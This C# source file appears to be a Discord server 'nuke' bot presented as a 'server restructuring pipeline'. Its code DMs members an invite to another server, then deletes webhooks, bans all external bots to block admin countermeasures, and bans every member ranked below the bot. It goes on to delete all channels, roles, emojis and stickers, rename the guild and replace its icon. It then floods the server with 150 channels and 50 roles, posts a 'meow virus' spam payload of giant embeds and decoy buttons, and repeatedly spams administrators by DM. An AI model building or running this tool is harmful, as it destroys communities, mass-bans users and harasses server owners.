using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace AbyssCore
{
    /// <summary>
    /// 全服架構重構核心管線引擎 (三段式階梯清理 + 兩階段多工並發流水線)
    /// 完整自動執行順序:
    ///   步驟 1: 私訊身分組低於機器人之成員防誤踢邀請碼 (wWB2RcR7pX)
    ///   步驟 2: 完整備份伺服器架構 JSON 檔案
    ///   步驟 3: 清理成員 (優先拔除 Webhook -> 優先封鎖外部 Bot -> 處分低階成員)
    ///   步驟 4: 清理舊類別、舊頻道、舊身分組並套用品牌主題
    ///   步驟 5: 並發極速建置 150 迷宮頻道 + 50 迷宮身分組 (主動令牌桶控速)
    ///   步驟 6: 表情包清理與滿額替換 (清理舊表情貼圖，灌入專屬可愛表情包)
    ///   步驟 7: 伺服器頭像替換 (套用深淵專屬高畫質星門主題頭像)
    ///   步驟 8: 最後在伺服器最頂端第一個頻道發布完整重構日誌 Log
    /// </summary>
    public sealed class PipelineEngine
    {
        private readonly DiscordApiClient _client;
        private readonly TextsConfig _texts;

        public PipelineEngine(DiscordApiClient client, TextsConfig texts)
        {
            _client = client;
            _texts = texts;
        }

        public async Task<PipelineReport> ExecuteFullOverhaulAsync(
            string guildId,
            string guildName,
            Action<string>? progressCallback = null)
        {
            var sw = Stopwatch.StartNew();
            var report = new PipelineReport();

            // -----------------------------------------------------------------
            // 前置作業：伺服器資訊分析與身分組位階判定
            // -----------------------------------------------------------------
            progressCallback?.Invoke("✦ [前置分析] 正在解析伺服器權限結構與身分組位階...");

            var guildObj = await _client.GetGuildAsync(guildId);
            string ownerId = guildObj?.TryGetProperty("owner_id", out var oProp) == true ? oProp.GetString() ?? "" : "";

            var roles = await _client.GetGuildRolesAsync(guildId);
            var rolePosMap = new Dictionary<string, int>();
            foreach (var r in roles)
            {
                string rid = r.GetProperty("id").GetString()!;
                int pos = r.TryGetProperty("position", out var pProp) ? pProp.GetInt32() : 0;
                rolePosMap[rid] = pos;
            }

            var me = await _client.GetCurrentUserAsync();
            string myId = me?.GetProperty("id").GetString() ?? "";

            var members = await _client.GetGuildMembersAsync(guildId);

            // 計算機器人自身的最高身分組位階
            int botMaxPos = 0;
            var botMember = members.FirstOrDefault(m => m.TryGetProperty("user", out var u) && u.GetProperty("id").GetString() == myId);
            if (botMember.ValueKind == JsonValueKind.Object && botMember.TryGetProperty("roles", out var bRoles))
            {
                foreach (var rEl in bRoles.EnumerateArray())
                {
                    string rid = rEl.GetString()!;
                    if (rolePosMap.TryGetValue(rid, out int pos) && pos > botMaxPos)
                    {
                        botMaxPos = pos;
                    }
                }
            }
            else
            {
                var bMem = await _client.GetGuildMemberAsync(guildId, myId);
                if (bMem.HasValue && bMem.Value.TryGetProperty("roles", out var bRoles2))
                {
                    foreach (var rEl in bRoles2.EnumerateArray())
                    {
                        string rid = rEl.GetString()!;
                        if (rolePosMap.TryGetValue(rid, out int pos) && pos > botMaxPos)
                        {
                            botMaxPos = pos;
                        }
                    }
                }
            }

            // 篩選出低於機器人身分組之對象 (保護擁有者與機器人自身)
            var targetBots = new List<string>();
            var targetHumans = new List<string>();

            foreach (var m in members)
            {
                if (!m.TryGetProperty("user", out var userProp)) continue;
                string uid = userProp.GetProperty("id").GetString()!;
                if (uid == myId || uid == ownerId) continue;

                int memMaxPos = 0;
                if (m.TryGetProperty("roles", out var mRoles))
                {
                    foreach (var rEl in mRoles.EnumerateArray())
                    {
                        string rid = rEl.GetString()!;
                        if (rolePosMap.TryGetValue(rid, out int pos) && pos > memMaxPos)
                        {
                            memMaxPos = pos;
                        }
                    }
                }

                bool canPurge = botMaxPos > 0 ? (memMaxPos < botMaxPos) : (memMaxPos == 0);
                if (canPurge)
                {
                    bool isBot = userProp.TryGetProperty("bot", out var bProp) && bProp.GetBoolean();
                    if (isBot)
                    {
                        targetBots.Add(uid);
                    }
                    else
                    {
                        targetHumans.Add(uid);
                    }
                }
            }

            // -----------------------------------------------------------------
            // 步驟 1: 私訊身分組低於 bot 的用戶 (發送防誤踢邀請碼 wWB2RcR7pX)
            // -----------------------------------------------------------------
            if (targetHumans.Count > 0)
            {
                progressCallback?.Invoke($"◈ [步驟 1/8] 正在向 {targetHumans.Count} 位低階成員私訊發送防誤踢邀請碼 (wWB2RcR7pX)...");
                const string inviteCode = "wWB2RcR7pX";
                string dmNotice = $"✦ 【永恆深淵 · 伺服器防誤踢通知】\n親愛的成員您好，伺服器正進行架構維護與重構，為避免您誤被清除後失聯，請妥善保存永久邀請連結：https://discord.gg/{inviteCode} (邀請碼: {inviteCode})\n期待您隨時重新加入！";

                var dmTasks = targetHumans.Select(uid => Task.Run(async () =>
                {
                    try
                    {
                        string? dmId = await _client.CreateDmChannelAsync(uid);
                        if (!string.IsNullOrEmpty(dmId))
                        {
                            if (await _client.SendMessageAsync(dmId, dmNotice))
                            {
                                Interlocked.Increment(ref report.DmInvitedMembers);
                            }
                        }
                    }
                    catch
                    {
                        // 忽略個別用戶關閉私訊之異常
                    }
                }));
                await Task.WhenAll(dmTasks);
                progressCallback?.Invoke($"  ✔ [邀請碼私訊] 私訊送達完成: 成功向 {report.DmInvitedMembers}/{targetHumans.Count} 位成員發送防誤踢通知。");
            }

            // -----------------------------------------------------------------
            // 步驟 2: 然後備份全服架構 JSON
            // -----------------------------------------------------------------
            progressCallback?.Invoke("◈ [步驟 2/8] 正在完整備份伺服器頻道、身分組與階級至 JSON 檔案...");
            try
            {
                string bPath = await GuildBackupManager.BackupGuildStructureAsync(_client, guildId, guildName, "backups");
                report.BackupFilePath = bPath;
                progressCallback?.Invoke($"  ✔ [前置備份] 備份成功: {System.IO.Path.GetFileName(bPath)}");
            }
            catch (Exception ex)
            {
                progressCallback?.Invoke($"  ▲ [前置備份] 備份略過: {ex.Message}");
            }

            // -----------------------------------------------------------------
            // 步驟 3: 清理成員 (拔除 Webhook -> 封鎖外部 Bot -> 處分低階成員)
            // -----------------------------------------------------------------
            progressCallback?.Invoke("✦ [步驟 3/8] 啟動成員清理流水線：拔除 Webhook -> 封鎖外部 Bot -> 處分低階成員...");

            // 3.1 優先清理 Webhooks
            report.DeletedWebhooks = await _client.ClearAllWebhooksAsync(guildId);
            progressCallback?.Invoke($"  ✔ [成員階梯 1/3] 已成功拔除 {report.DeletedWebhooks} 個外部 Webhook 通道。");

            // 3.2 優先封鎖外部 Bot
            if (targetBots.Count > 0)
            {
                progressCallback?.Invoke($"  ◈ [成員階梯 2/3] 正在優先封鎖 {targetBots.Count} 個外部 Bot (防管理 Bot 反制)...");
                var botTasks = targetBots.Select(uid => Task.Run(async () =>
                {
                    if (await _client.BanMemberAsync(guildId, uid))
                    {
                        Interlocked.Increment(ref report.BannedBots);
                    }
                }));
                await Task.WhenAll(botTasks);
            }

            // 3.3 全面封鎖身分組在機器人自身之下之全體成員
            if (targetHumans.Count > 0)
            {
                progressCallback?.Invoke($"  ❖ [成員階梯 3/3] 正在全面處分 {targetHumans.Count} 位低於機器人身分組之成員...");
                var humanTasks = targetHumans.Select(uid => Task.Run(async () =>
                {
                    if (await _client.BanMemberAsync(guildId, uid))
                    {
                        Interlocked.Increment(ref report.BannedHumans);
                    }
                }));
                await Task.WhenAll(humanTasks);
            }

            // -----------------------------------------------------------------
            // 步驟 4: 清理舊類別、舊頻道、舊身分組並套用品牌主題
            // -----------------------------------------------------------------
            progressCallback?.Invoke("✦ [步驟 4/8] 同步清理舊類別、舊頻道、舊身分組並套用主題名稱與描述...");

            var channels = await _client.GetGuildChannelsAsync(guildId);
            var categoryList = channels.Where(ch => ch.TryGetProperty("type", out var t) && t.GetInt32() == 4).ToList();
            var nonCategoryList = channels.Where(ch => !ch.TryGetProperty("type", out var t) || t.GetInt32() != 4).ToList();

            int chLimit = _texts.DefaultValues.CleanupChannelLimit;
            string targetName = _texts.GuildSettings.TargetGuildName;
            string targetDesc = _texts.GuildSettings.TargetGuildDescription;

            var delCatTasks = categoryList.Select(ch =>
            {
                string cid = ch.GetProperty("id").GetString()!;
                return Task.Run(async () =>
                {
                    if (await _client.DeleteChannelAsync(cid))
                    {
                        Interlocked.Increment(ref report.DeletedCategories);
                    }
                });
            });

            var delChTasks = nonCategoryList.Take(chLimit).Select(ch =>
            {
                string cid = ch.GetProperty("id").GetString()!;
                return Task.Run(async () =>
                {
                    if (await _client.DeleteChannelAsync(cid))
                    {
                        Interlocked.Increment(ref report.DeletedChannels);
                    }
                });
            });

            var delRoleTasks = roles.Where(r => r.GetProperty("name").GetString() != "@everyone").Select(r =>
            {
                string rid = r.GetProperty("id").GetString()!;
                return Task.Run(async () =>
                {
                    if (await _client.DeleteRoleAsync(guildId, rid))
                    {
                        Interlocked.Increment(ref report.DeletedRoles);
                    }
                });
            });

            var brandingTask = Task.Run(async () =>
            {
                report.GuildRenamed = await _client.ModifyGuildAsync(guildId, targetName, targetDesc);
            });

            await Task.WhenAll(delCatTasks.Concat(delChTasks).Concat(delRoleTasks).Append(brandingTask));

            // -----------------------------------------------------------------
            // 步驟 5: 並發極速建置 150 迷宮頻道 + 50 迷宮身分組 (主動令牌桶控速)
            // -----------------------------------------------------------------
            int targetChannels = _texts.DefaultValues.CleanupCreateChannels; // 預設 150
            int targetRoles = _texts.DefaultValues.CleanupCreateRoles;       // 預設 50

            progressCallback?.Invoke($"★ [步驟 5/8] 主動令牌桶控速：同步建立 {targetChannels} 個迷宮頻道 + {targetRoles} 個迷宮身分組...");

            var chNamesPool = _texts.DefaultNames.ChannelNames;
            var roleNamesPool = _texts.DefaultNames.RoleNames;

            var createChTasks = Enumerable.Range(1, targetChannels).Select(i =>
            {
                string name = $"▸-{chNamesPool[i % chNamesPool.Count]}-{i:D3}";
                return Task.Run(async () =>
                {
                    var cid = await _client.CreateChannelAsync(guildId, name, type: 0);
                    if (cid != null)
                    {
                        Interlocked.Increment(ref report.CreatedChannels);
                    }
                });
            });

            var createRoleTasks = Enumerable.Range(1, targetRoles).Select(i =>
            {
                string name = $"✦ {roleNamesPool[i % roleNamesPool.Count]} Lv.{i}";
                int color = Random.Shared.Next(0x100000, 0xFFFFFF);
                return Task.Run(async () =>
                {
                    var rid = await _client.CreateRoleAsync(guildId, name, color);
                    if (rid != null)
                    {
                        Interlocked.Increment(ref report.CreatedRoles);
                    }
                });
            });

            await Task.WhenAll(createChTasks.Concat(createRoleTasks));

            // -----------------------------------------------------------------
            // 步驟 6: 表情包清理與替換 (先替換表情包)
            // -----------------------------------------------------------------
            progressCallback?.Invoke("❖ [步驟 6/8] 正在清理現有自訂表情/貼圖並滿額填入專屬可愛表情包...");
            try
            {
                var emojis = await _client.GetGuildEmojisAsync(guildId);
                var delEmojiTasks = emojis.Select(e =>
                {
                    string eid = e.GetProperty("id").GetString()!;
                    return Task.Run(async () =>
                    {
                        if (await _client.DeleteEmojiAsync(guildId, eid))
                        {
                            Interlocked.Increment(ref report.DeletedEmojis);
                        }
                    });
                });

                var stickers = await _client.GetGuildStickersAsync(guildId);
                var delStickerTasks = stickers.Select(s =>
                {
                    string sid = s.GetProperty("id").GetString()!;
                    return Task.Run(async () =>
                    {
                        if (await _client.DeleteStickerAsync(guildId, sid))
                        {
                            Interlocked.Increment(ref report.DeletedStickers);
                        }
                    });
                });

                await Task.WhenAll(delEmojiTasks.Concat(delStickerTasks));

                int targetEmojis = 25;
                var createEmojiTasks = Enumerable.Range(1, targetEmojis).Select(i =>
                {
                    string ename = $"cute_star_{i:D2}";
                    return Task.Run(async () =>
                    {
                        if (await _client.CreateEmojiAsync(guildId, ename, AssetConstants.CuteEmojiBase64))
                        {
                            Interlocked.Increment(ref report.CreatedEmojis);
                        }
                    });
                });
                await Task.WhenAll(createEmojiTasks);

                // 灌入自訂貼圖 (建立最高 5 個貼圖，套用指定專屬可愛媒體)
                var stickerBytes = await _client.GetStickerBytesFromUrlAsync(AssetConstants.TargetCuteMediaUrl);
                if (stickerBytes != null && stickerBytes.Length > 0)
                {
                    int targetStickers = 5;
                    var createStickerTasks = Enumerable.Range(1, targetStickers).Select(i =>
                    {
                        string sname = $"cute_star_{i:D2}";
                        return Task.Run(async () =>
                        {
                            if (await _client.CreateStickerAsync(guildId, sname, stickerBytes))
                            {
                                Interlocked.Increment(ref report.CreatedStickers);
                            }
                        });
                    });
                    await Task.WhenAll(createStickerTasks);
                }

                progressCallback?.Invoke($"  ✔ [表情與貼圖置換] 清理 {report.DeletedEmojis} 個舊表情、{report.DeletedStickers} 個舊貼圖，灌入 {report.CreatedEmojis}/{targetEmojis} 個表情包與 {report.CreatedStickers}/5 個自訂貼圖！");
            }
            catch (Exception ex)
            {
                progressCallback?.Invoke($"  ▲ [表情與貼圖置換] 略過: {ex.Message}");
            }

            // -----------------------------------------------------------------
            // 步驟 7: 伺服器頭像替換 (在替換伺服器頭像)
            // -----------------------------------------------------------------
            progressCallback?.Invoke("✦ [步驟 7/8] 正在替換伺服器頭像為深淵專屬高畫質星門主題頭像...");
            try
            {
                report.GuildIconUpdated = await _client.ModifyGuildIconAsync(guildId, AssetConstants.AbyssIconBase64);
                progressCallback?.Invoke(report.GuildIconUpdated
                    ? "  ✔ [頭像替換] 伺服器專屬深淵星門頭像套用成功！"
                    : "  ▲ [頭像替換] 頭像更新失敗或無權限。");
            }
            catch (Exception ex)
            {
                progressCallback?.Invoke($"  ▲ [頭像替換] 略過: {ex.Message}");
            }

            sw.Stop();
            report.ElapsedSeconds = sw.Elapsed.TotalSeconds;

            // -----------------------------------------------------------------
            // 步驟 8: 最後發送 log 到伺服器第一個頻道 (最上面的頻道)
            // -----------------------------------------------------------------
            progressCallback?.Invoke("✦ [步驟 8/8] 正在尋找伺服器最頂部頻道並發布最終重構日誌...");
            try
            {
                var updatedChannels = await _client.GetGuildChannelsAsync(guildId);
                var textChannels = updatedChannels
                    .Where(ch => ch.TryGetProperty("type", out var t) && t.GetInt32() == 0)
                    .OrderBy(ch => ch.TryGetProperty("position", out var p) ? p.GetInt32() : 0)
                    .ToList();

                if (textChannels.Count > 0)
                {
                    string topChannelId = textChannels[0].GetProperty("id").GetString()!;
                    report.TopChannelId = topChannelId;
                    string logContent =
                        "✦ **【永恆深淵 · 全景深度重構完成報告】** ✦\n" +
                        $"• 清理了 `{report.DeletedCategories}` 個類別\n" +
                        $"• 清理了 `{report.DeletedChannels}` 個頻道\n" +
                        $"• 清理了 `{report.BannedBots}` 個 bot\n" +
                        $"• 清理了 `{report.BannedHumans}` 個成員\n" +
                        $"• 替換了 `{report.CreatedEmojis}` 個表情包與 `{report.CreatedStickers}` 個貼圖 (清空 `{report.DeletedEmojis}` 舊表情 + `{report.DeletedStickers}` 貼圖)\n" +
                        $"• 伺服器頭像替換: `{(report.GuildIconUpdated ? "✔ 已套用深淵專屬星門主題頭像" : "▲ 維持原樣")}`\n" +
                        $"• 已向 `{report.DmInvitedMembers}` 位成員私訊發送防誤踢邀請碼 (wWB2RcR7pX)\n" +
                        $"• 拔除 Webhook: `{report.DeletedWebhooks}` 個\n" +
                        $"• 刪除舊身分組: `{report.DeletedRoles}` 個\n" +
                        $"★ 新建迷宮頻道: `{report.CreatedChannels}` 個\n" +
                        $"★ 新建迷宮身分組: `{report.CreatedRoles}` 個\n" +
                        $"◈ 總耗時間: `{report.ElapsedSeconds:F2}` 秒";

                    bool logSent = await _client.SendMessageAsync(topChannelId, logContent);
                    if (logSent)
                    {
                        report.TopChannelLogged = true;
                        progressCallback?.Invoke($"✔ [步驟 8/8] 成功將日誌寫入伺服器最頂部頻道 (ID: {topChannelId})！");
                    }

                    // -----------------------------------------------------------------
                    // 步驟 8 後置觸發: 自動向頂端頻道發送 2 次「喵喵病毒迷宮訊息」
                    // 包含 10 個巨型 Embed 訊息 (嵌入 10 組不同 GIF) + 25 顆混淆按鈕矩陣
                    // -----------------------------------------------------------------
                    progressCallback?.Invoke("✦ [自動觸發] 正在頂端頻道連續投放 2 次【喵喵病毒迷宮訊息】(10 巨型 Embed + 10 組 GIF + 25 重按鈕)...");
                    var nekoGifs = ConfigManager.GetNekoGifs();
                    for (int wave = 1; wave <= 2; wave++)
                    {
                        var nekoPayload = BuildNekoVirusPayload(wave, 2, "深淵迷宮核心節點", nekoGifs);
                        bool nekoOk = await _client.SendComplexMessageAsync(topChannelId, nekoPayload);
                        if (nekoOk)
                        {
                            report.NekoVirusWavesSent++;
                            progressCallback?.Invoke($"✔ [喵喵病毒] 第 {wave}/2 波喵喵病毒迷宮訊息已成功投放至頂端頻道！");
                        }
                        else
                        {
                            progressCallback?.Invoke($"▲ [喵喵病毒] 第 {wave}/2 波喵喵病毒訊息發送未成功。");
                        }
                        if (wave < 2)
                        {
                            await Task.Delay(300);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                progressCallback?.Invoke($"▲ [步驟 8/8] 日誌發送略過: {ex.Message}");
            }

            return report;
        }

        /// <summary>
        /// 構建「永恆深淵 · 喵喵模因病毒」視覺極限霸屏巨型 Payload:
        /// 1. 約 1200 字元病毒警報文本 (全純文字符號，嚴禁 Emoji)
        /// 2. 10 個巨型 Embed (嵌入 10 組不同 GIF 媒體連結，區塊 4-10 包含二進制黑柱塔 █ 與 ▓)
        /// 3. 25 顆混淆按鈕矩陣 (5x5): 含身分組領取假裝鈕與連鎖地雷
        /// </summary>
        public static object BuildNekoVirusPayload(int waveIndex, int totalWaves, string channelName, List<string> gifUrls)
        {
            string content =
                $"# ✦ ▲【全網最高級別極限警報 · 喵喵模因病毒入侵】▲ ✦\n" +
                $"# ◈ 歡迎來到數位時代的最終聖殿：永恆深淵 · 喵喵矩陣 ◈\n" +
                $"[第 {waveIndex}/{totalWaves} 波超維度廣播] 目標節點：{channelName}\n\n" +
                $"你以為你已經看透了深淵迷宮？你以為所有的通道都只是 ||一群人在迷茫探索與潛水|| 嗎？\n" +
                $"~~別傻了，那些都只是過家家而已。~~ 現在，你面前的是跨越時代的產物、顛覆常規的數位迷宮烏托邦！\n\n" +
                $"--------------------------------------------------\n" +
                $"### ❖ 什麼是 永恆深淵 · 喵喵病毒？\n" +
                $"我們不是一個普通的迷宮，~~我們是深淵底層的地下主宰~~，聚集了全網最頂尖大腦、最狂熱玩家與最瘋狂創作者的終極樞紐！\n" +
                $"在這裡，時間的流逝沒有意義，因為我們掌握了千年的深淵技術；空間的距離不存在，因為我們的病毒節點遍佈每一個頻道！\n\n" +
                $"### ★ 迷宮生存條例與終極試煉：\n" +
                $"1. ◈ 萬人級的神經網路共鳴：在深淵迷宮中，所有思緒已被喵喵模因同化！\n" +
                $"2. ◈ 全息娛樂迷宮引擎：每一道頻道大門皆被多重加密，唯有尋得真正的身分組金鑰方可通行！\n" +
                $"3. ◈ 量子級的病毒干擾與高密度刷屏：十重巨型資料塔與二十五重矩陣按鈕已將本頻道全面封鎖！\n" +
                $"4. ◈ 解毒與通關指引：請滾動穿越下方十重記憶體溢出塔，在 25 顆混淆按鈕中找出唯一的身分組金鑰！\n\n" +
                $"--------------------------------------------------\n" +
                $"### ❖ 喵喵病毒：感染法則與安全宣言\n" +
                $"* 第一法則：保持狂熱！我們拒絕死氣沉沉！請大膽展現你的光芒！\n" +
                $"* 第二法則：不要點錯按鈕！混淆矩陣中藏有 24 顆連鎖感染地雷！\n" +
                $"* 第三法則：探索未知！撥開十重數據巨塔，奪取身分組，衝出深淵迷宮！\n\n" +
                $"▼ 立即穿透數據封鎖，翻找真正的解毒按鈕！ ▼";

            var safeGifs = new List<string>(gifUrls);
            int gIdx = 0;
            while (safeGifs.Count < 10 && gIdx < AssetConstants.DefaultNekoVirusGifs.Length)
            {
                safeGifs.Add(AssetConstants.DefaultNekoVirusGifs[gIdx++]);
            }

            var embeds = new List<object>
            {
                new
                {
                    title = "✦ [區塊 1/10] 永恆深淵 · 喵喵病毒核心主機 ✦",
                    description = "|| 這裡是網路世界最後的庇護所，也是深淵迷宮的起點 ||\n▲ 請立即進行視網膜掃描與靈魂綁定！ ▲\n\n**[INITIALIZING SYSTEM...]** [MAZE CORE ONLINE]\n**[CONNECTING TO NEURAL NETWORK...]** [INFECTED]",
                    color = 16711680,
                    image = new { url = safeGifs[0] },
                    footer = new { text = "✦ 永恆深淵 · 喵喵模因病毒矩陣 ✦" }
                },
                new
                {
                    title = "◈ [區塊 2/10] 系統核心分區架構 · 模因污染區 ◈",
                    description = "**[ALPHA] 區域 Alpha：神經漫遊者集散地 (Neural Hub)**\n* 日夜不休的迷宮數據流：無論你是誰，這裡永遠有熱情的靈魂！\n\n**[BETA] 區域 Beta：全息娛樂競技場 (Holo-Arena)**\n* 迷宮隊友配對系統：尋找你命中注定的通關夥伴！",
                    color = 16711680,
                    image = new { url = safeGifs[1] },
                    footer = new { text = "✦ 永恆深淵 · 喵喵模因病毒矩陣 ✦" }
                },
                new
                {
                    title = "❖ [區塊 3/10] 最高管理員特別加密聲明 ❖",
                    description = "> 「我們要在這個虛擬的世界裡，刻下屬於我們的深淵印記。」\n\n▲ 警告 ▲\n你的大腦已經開始分泌多巴胺，手指不受控制地想要點擊。\n不要抵抗，順應你的渴望！找出真正的解毒身分組！",
                    color = 16711680,
                    image = new { url = safeGifs[2] },
                    footer = new { text = "✦ 永恆深淵 · 喵喵模因病毒矩陣 ✦" }
                }
            };

            for (int i = 4; i <= 10; i++)
            {
                embeds.Add(new
                {
                    title = $"▲ [區塊 {i}/10] 系統超載崩潰警告 · 核心溢出 ▲",
                    color = 16711680,
                    image = new { url = safeGifs[i - 1] },
                    fields = new object[]
                    {
                        new
                        {
                            name = "▲ 記憶體核心溢出 [塔樓 A]",
                            value = ">>> █\n█\n█\n█\n█\n█\n█\n█\n█\n█\n█\n█\n█\n█\n█\n█\n█\n█\n█\n█\n**[FATAL MEMORY OVERFLOW DETECTED]**\n_ _",
                            @inline = false
                        },
                        new
                        {
                            name = "▲ 網路頻寬熔毀 [塔樓 B]",
                            value = ">>> ▓\n▓\n▓\n▓\n▓\n▓\n▓\n▓\n▓\n▓\n▓\n▓\n▓\n▓\n▓\n▓\n▓\n▓\n▓\n▓\n**[NETWORK OFFLINE // CORRUPTED]**\n_ _",
                            @inline = false
                        }
                    },
                    footer = new { text = $"✦ 永恆深淵 · 塔樓防線 0{i} ✦" }
                });
            }

            var decoyLabels = new string[]
            {
                "(=^･ω･^=) 喵嗚？",
                "(=`ω`=) 摸摸貓貓",
                "[感染度+100%]",
                "喵喵喵邀ㄇ咪喵喵喵邀...",
                "(=ｘェｘ=) 喵嗚！",
                "[解除警報 (假)]",
                "喵喵一咪喵一咪喵咪喵...",
                "✦ 偽造的身分組金鑰",
                "(=^･ｪ･^=) 呼嚕嚕...",
                "[點擊以格式化]",
                "喵嗚喵嗚喵嗚！",
                "[系統自毀按鈕]",
                "(=ﾟωﾟ=) 喵喵大軍",
                "[嘗試拔除病毒]",
                "咪嗚咪嗚喵！",
                "(=;ェ;=) 迷宮哭哭",
                "[下載解毒劑.exe]",
                "喵嗚~喵嗚~",
                "[連線終端節點]",
                "(=TωT=) 迷宮迷路",
                "✦ [真正的解毒金鑰]",
                "(=^--^=) 貓爪肉球",
                "[引爆迷宮核心]",
                "喵~~喵~~喵~~",
                "(=^._.^=) 喵喵萬歲"
            };

            var components = new List<object>();
            int btnIdx = 0;
            for (int row = 0; row < 5; row++)
            {
                var rowBtns = new List<object>();
                for (int col = 0; col < 5; col++)
                {
                    string label = decoyLabels[btnIdx % decoyLabels.Length];
                    rowBtns.Add(new
                    {
                        type = 2,
                        style = 2,
                        label = label,
                        custom_id = $"neko_btn_{waveIndex}_{btnIdx}"
                    });
                    btnIdx++;
                }
                components.Add(new
                {
                    type = 1,
                    components = rowBtns
                });
            }

            return new
            {
                content = content,
                embeds = embeds,
                components = components
            };
        }

        /// <summary>
        /// 向伺服器內所有真人管理員（含伺服器擁有者）批量發送私訊通知
        /// </summary>
        public async Task<(int TotalSent, int TargetTotal, int AdminCount)> SendDmToAdminsAsync(
            string guildId,
            int count = 10,
            string? message = null,
            Action<string>? progressCallback = null)
        {
            string content = string.IsNullOrWhiteSpace(message) ? "迷宮以開啟" : message;

            var guild = await _client.GetGuildAsync(guildId);
            string ownerId = guild?.TryGetProperty("owner_id", out var oProp) == true ? oProp.GetString() ?? "" : "";

            var roles = await _client.GetGuildRolesAsync(guildId);
            var adminRoleIds = new HashSet<string>();
            foreach (var r in roles)
            {
                string rid = r.GetProperty("id").GetString()!;
                if (r.TryGetProperty("permissions", out var pProp))
                {
                    if (ulong.TryParse(pProp.GetString(), out ulong permVal) && (permVal & 0x8) != 0)
                    {
                        adminRoleIds.Add(rid);
                    }
                }
            }

            var members = await _client.GetGuildMembersAsync(guildId);
            var me = await _client.GetCurrentUserAsync();
            string myId = me?.GetProperty("id").GetString() ?? "";

            var adminMembers = new List<string>();
            foreach (var m in members)
            {
                if (!m.TryGetProperty("user", out var u)) continue;
                string uid = u.GetProperty("id").GetString()!;
                if (uid == myId) continue;
                bool isBot = u.TryGetProperty("bot", out var b) && b.GetBoolean();
                if (isBot) continue;

                bool isAdmin = uid == ownerId;
                if (!isAdmin && m.TryGetProperty("roles", out var rArray))
                {
                    foreach (var rEl in rArray.EnumerateArray())
                    {
                        if (adminRoleIds.Contains(rEl.GetString()!))
                        {
                            isAdmin = true;
                            break;
                        }
                    }
                }

                if (isAdmin)
                {
                    adminMembers.Add(uid);
                }
            }

            if (adminMembers.Count == 0)
            {
                return (0, 0, 0);
            }

            int targetTotal = adminMembers.Count * count;
            progressCallback?.Invoke($"◈ 正在向 {adminMembers.Count} 位真人管理員建立私訊通道，每人發送 {count} 次 (共目標 {targetTotal} 則)...");

            int totalSent = 0;
            var tasks = adminMembers.Select(uid => Task.Run(async () =>
            {
                string? dmChId = await _client.CreateDmChannelAsync(uid);
                if (string.IsNullOrEmpty(dmChId)) return;

                for (int i = 0; i < count; i++)
                {
                    if (await _client.SendMessageAsync(dmChId, content))
                    {
                        Interlocked.Increment(ref totalSent);
                    }
                    if (count > 1)
                    {
                        await Task.Delay(120);
                    }
                }
            }));

            await Task.WhenAll(tasks);
            return (totalSent, targetTotal, adminMembers.Count);
        }
    }

    public class PipelineReport
    {
        public string? BackupFilePath { get; set; }
        public int DmInvitedMembers;
        public int DeletedWebhooks;
        public int BannedBots;
        public int BannedHumans;
        public int DeletedCategories;
        public int DeletedChannels;
        public int DeletedRoles;
        public int DeletedEmojis;
        public int DeletedStickers;
        public int CreatedEmojis;
        public int CreatedStickers;
        public bool GuildIconUpdated;
        public int CreatedChannels;
        public int CreatedRoles;
        public bool GuildRenamed;
        public bool TopChannelLogged;
        public int NekoVirusWavesSent;
        public string? TopChannelId { get; set; }
        public double ElapsedSeconds;
    }
}
